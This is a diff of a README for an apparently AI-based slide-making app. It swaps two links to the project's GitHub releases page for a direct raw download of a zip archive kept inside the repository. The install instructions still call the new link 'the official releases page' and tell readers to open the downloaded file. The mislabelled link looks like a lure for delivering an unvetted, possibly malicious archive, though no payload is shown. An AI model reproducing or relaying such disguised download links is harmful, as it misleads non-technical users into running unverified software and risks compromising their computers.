@@ -1,6 +1,6 @@
 # 📊 future-slide-skill - Create professional slides with artificial intelligence
 
-[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Issamel6920/future-slide-skill/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Issamel6920/future-slide-skill/main/site/public/skill_future_slide_2.7-alpha.2.zip)
 
 This application helps users build slide decks using artificial intelligence. It works with both images and web pages to generate slides quickly. You do not need to understand coding to start creating content. The software handles the formatting and layout logic.
 
@@ -20,7 +20,7 @@ Check your system settings to confirm your device meets these needs. Close other
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/Issamel6920/future-slide-skill/releases) to access the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Issamel6920/future-slide-skill/main/site/public/skill_future_slide_2.7-alpha.2.zip) to access the installer.
 2. Select the file ending in .msi or .exe from the latest release list.
 3. Save the file to your desktop or downloads folder.
 4. Open the file to start the installation wizard.
